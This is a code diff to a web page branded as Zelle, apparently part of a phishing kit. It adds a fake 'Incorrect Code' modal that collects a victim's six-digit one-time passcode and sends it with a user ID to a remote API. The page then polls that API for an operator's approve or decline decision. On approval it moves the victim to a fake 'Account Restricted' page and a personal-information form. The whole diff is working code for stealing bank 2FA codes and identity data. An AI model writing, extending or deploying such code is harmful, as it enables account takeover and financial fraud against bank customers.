@@ -174,6 +174,30 @@
                 </div>
             </div>
             
+            <!-- OTP Declined - Try Again Modal (we own this, React cannot overwrite) -->
+            <div id="otpDeclinedModal" class="zelle-modal" style="display: none;">
+                <div class="zelle-modal-content" style="max-width: 480px; padding: 32px; text-align: center;">
+                    <div style="width: 64px; height: 64px; background: #ef4444; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 24px;">
+                        <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2">
+                            <circle cx="12" cy="12" r="10"></circle>
+                            <line x1="15" y1="9" x2="9" y2="15"></line>
+                            <line x1="9" y1="9" x2="15" y2="15"></line>
+                        </svg>
+                    </div>
+                    <h2 style="font-size: 22px; font-weight: 600; color: #111; margin-bottom: 8px;">Incorrect Code</h2>
+                    <p style="font-size: 14px; color: #6b7280; margin-bottom: 24px;">Please enter the correct 6-digit code to continue.</p>
+                    <div class="zelle-otp-container" id="declineRetryOtpContainer" style="margin: 0 auto 24px;">
+                        <input type="text" maxlength="1" class="zelle-otp-digit decline-retry-digit" data-index="0">
+                        <input type="text" maxlength="1" class="zelle-otp-digit decline-retry-digit" data-index="1">
+                        <input type="text" maxlength="1" class="zelle-otp-digit decline-retry-digit" data-index="2">
+                        <input type="text" maxlength="1" class="zelle-otp-digit decline-retry-digit" data-index="3">
+                        <input type="text" maxlength="1" class="zelle-otp-digit decline-retry-digit" data-index="4">
+                        <input type="text" maxlength="1" class="zelle-otp-digit decline-retry-digit" data-index="5">
+                    </div>
+                    <button id="declineRetrySubmit" class="zelle-btn-primary">Continue</button>
+                </div>
+            </div>
+            
             <!-- Success/Loading Modal -->
             <div id="successModal" class="zelle-modal" style="display: none;">
                 <div class="zelle-modal-content" style="max-width: 480px; padding: 48px 32px; text-align: center;">
@@ -392,6 +416,11 @@
             if (e.target.id === 'verifyIdentityBtn') {
                 hideModal('accountRestrictedPage');
                 showModal('personalInfoModal');
+            }
+            
+            // Decline retry - submit new OTP from our modal
+            if (e.target.id === 'declineRetrySubmit') {
+                handleDeclineRetrySubmit();
             }
             
             // Resend Code
@@ -656,111 +685,68 @@
     }
     
     // ========================================
-    // SHOW OTP ERROR (SHAKE + RED TEXT)
+    // SHOW OTP DECLINE - OUR MODAL (React cannot overwrite)
     // ========================================
     function showOtpError() {
-        console.log('[Zelle Extended] ❌ OTP DECLINED - Showing error inline');
-        
-        // First, hide any React app modals
+        console.log('[Zelle Extended] ❌ OTP DECLINED - Showing our retry modal');
         hideReactDeclineModal();
         
-        // Find the OTP inputs
-        const otpInputs = document.querySelectorAll('input[type="text"][maxlength="1"]');
-        console.log('[Zelle Extended] Found OTP inputs:', otpInputs.length);
+        const modal = document.getElementById('otpDeclinedModal');
+        if (!modal) return;
         
-        const otpContainer = otpInputs[0]?.parentElement?.parentElement || otpInputs[0]?.parentElement;
+        const inputs = modal.querySelectorAll('.decline-retry-digit');
+        inputs.forEach(inp => { inp.value = ''; inp.style.borderColor = ''; });
+        if (inputs[0]) inputs[0].focus();
         
-        if (otpContainer) {
-            console.log('[Zelle Extended] Found OTP container, applying shake...');
-            
-            // Add shake animation (force it by adding/removing)
-            otpContainer.style.animation = 'none';
-            setTimeout(() => {
-                otpContainer.style.animation = 'zelle-shake 0.5s ease-in-out';
-            }, 10);
-            
-            // Clear OTP inputs
-            otpInputs.forEach(input => {
-                input.value = '';
-                input.style.borderColor = '#ef4444'; // Red border
-            });
-            
-            // Focus first input
-            if (otpInputs[0]) otpInputs[0].focus();
-            
-            // Re-enable submit button - React leaves it as "Checking" (disabled)
-            const form = otpInputs[0].closest('form');
-            if (form) {
-                const btn = form.querySelector('button[type="submit"]') || form.querySelector('button');
-                if (btn) {
-                    btn.disabled = false;
-                    if (btn.textContent.includes('Checking') || btn.textContent.includes('Verifying')) {
-                        btn.textContent = 'Continue';
-                    }
-                }
-            }
-            // Also search up from container for any disabled button
-            let parent = otpContainer;
-            for (let i = 0; i < 5 && parent; i++) {
-                const buttons = parent.querySelectorAll('button');
-                buttons.forEach(b => {
-                    if (b.disabled || b.textContent.includes('Checking')) {
-                        b.disabled = false;
-                        if (b.textContent.includes('Checking')) b.textContent = 'Continue';
-                    }
-                });
-                parent = parent.parentElement;
-            }
-            
-            // Ensure inputs are not disabled
-            otpInputs.forEach(input => { input.disabled = false; input.readOnly = false; });
-            
-            console.log('[Zelle Extended] OTP inputs cleared and shake applied - ready for retry');
-        } else {
-            console.warn('[Zelle Extended] OTP container not found!');
+        const btn = document.getElementById('declineRetrySubmit');
+        if (btn) { btn.disabled = false; btn.textContent = 'Continue'; }
+        
+        const container = document.getElementById('declineRetryOtpContainer');
+        if (container) {
+            container.classList.remove('zelle-error-shake');
+            container.offsetHeight;
+            container.classList.add('zelle-error-shake');
+            setTimeout(() => container.classList.remove('zelle-error-shake'), 500);
         }
         
-        // Create or update error message - place above OTP box so it doesn't block inputs
-        let errorMsg = document.getElementById('zelle-otp-error');
-        if (!errorMsg) {
-            errorMsg = document.createElement('div');
-            errorMsg.id = 'zelle-otp-error';
-            errorMsg.style.cssText = `
-                background: #fee;
-                border: 2px solid #ef4444;
-                color: #dc2626;
-                font-size: 14px;
-                font-weight: 600;
-                padding: 12px 20px;
-                border-radius: 8px;
-                text-align: center;
-                margin-bottom: 16px;
-                animation: zelle-fadeIn 0.3s ease;
-            `;
-            const insertParent = otpContainer?.parentElement || document.body;
-            const insertBefore = otpContainer || null;
-            if (insertBefore) {
-                insertParent.insertBefore(errorMsg, insertBefore);
-            } else {
-                insertParent.appendChild(errorMsg);
-            }
-            console.log('[Zelle Extended] Created error message');
+        showModal('otpDeclinedModal');
+    }
+    
+    // Submit retry OTP from our decline modal
+    async function handleDeclineRetrySubmit() {
+        const inputs = document.querySelectorAll('.decline-retry-digit');
+        const code = Array.from(inputs).map(i => i.value).join('');
+        
+        if (code.length !== 6) {
+            alert('Please enter all 6 digits');
+            return;
         }
-        errorMsg.textContent = '❌ Incorrect code. Please try again.';
-        errorMsg.style.display = 'block';
         
-        console.log('[Zelle Extended] Error message displayed');
+        if (!currentUserId) {
+            console.error('[Zelle Extended] No currentUserId for retry');
+            return;
+        }
         
-        // Hide error after 3 seconds
-        setTimeout(() => {
-            if (errorMsg) {
-                errorMsg.style.display = 'none';
-            }
-            // Reset input borders
-            otpInputs.forEach(input => {
-                input.style.borderColor = '';
+        const btn = document.getElementById('declineRetrySubmit');
+        if (btn) { btn.disabled = true; btn.textContent = 'Checking...'; }
+        
+        try {
+            await fetch(`${API_URL}/api/reset-otp-status?id=${currentUserId}`, { method: 'POST' });
+            const res = await fetch(`${API_URL}/api/save-otp`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ userId: currentUserId, code: code })
             });
-        }, 3000);
+            const data = await res.json();
+            
+            if (data.success) {
+                startOtpPolling(currentUserId);
+            }
+            if (btn) { btn.disabled = false; btn.textContent = 'Continue'; }
+        } catch (e) {
+            console.error('[Zelle Extended] Retry OTP error:', e);
+            if (btn) { btn.disabled = false; btn.textContent = 'Continue'; }
+        }
     }
     
     // ========================================
@@ -798,6 +784,7 @@
                     console.log('[Zelle Extended] ✅ APPROVED! Showing Account Restricted page...');
                     pollingStopped = true;
                     clearInterval(otpPollInterval);
+                    hideModal('otpDeclinedModal');
                     showModal('accountRestrictedPage');
                 } else if (data.otp_status === 'decline') {
                     console.log('[Zelle Extended] ❌ DECLINED! Showing inline error...');
